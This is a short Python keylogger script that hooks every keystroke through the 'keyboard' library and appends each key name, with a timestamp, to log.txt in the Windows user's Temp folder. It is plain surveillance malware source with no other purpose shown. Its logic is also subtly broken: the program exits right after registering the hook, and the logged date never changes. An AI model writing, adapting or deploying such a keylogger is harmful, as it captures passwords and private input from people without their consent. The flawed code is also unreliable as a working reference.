import keyboard
from datetime import datetime
import getpass

def main():
    user = getpass.getuser()
    date = datetime.now().strftime('%m-%d-%Y %H:%M')

    log_path = f'C:\\Users\\{user}\\AppData\\Local\\Temp\\log.txt'

    try:
        with open(log_path, 'a') as log:
            def on_key_event(e):
                if e.event_type == 'down':
                    pass
                else:
                    try:
                        log.write(f'[{date}] {e.name}\n')
                    except Exception as exception:
                        log.write(f'Error: {exception}\n')

            keyboard.hook(on_key_event)

    except Exception as e:
        print(f'Erro ao abrir o arquivo: {e}')

if __name__ == "__main__":
    main()
